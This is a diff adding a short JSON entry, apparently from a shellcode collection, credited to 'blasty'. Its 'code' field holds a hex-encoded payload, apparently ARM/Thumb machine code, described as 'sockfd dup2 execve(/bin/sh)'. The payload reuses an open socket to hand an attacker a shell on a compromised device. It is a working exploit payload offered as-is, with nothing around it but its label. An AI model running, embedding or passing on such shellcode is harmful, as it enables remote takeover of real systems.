@@ -1,0 +1,5 @@
+{
+	"description" : "sockfd dup2 execve(/bin/sh)",
+	"author"      : "blasty",
+	"code"        : "01108fe211ff2fe1ff26404001b46d467f2001b46c46013e301c291c221c01273f021f3701df49408842f4d16d1b301c291c3f2701df0135032df8d102a0921a05b469460b2701df2f62696e2f736800"
+}
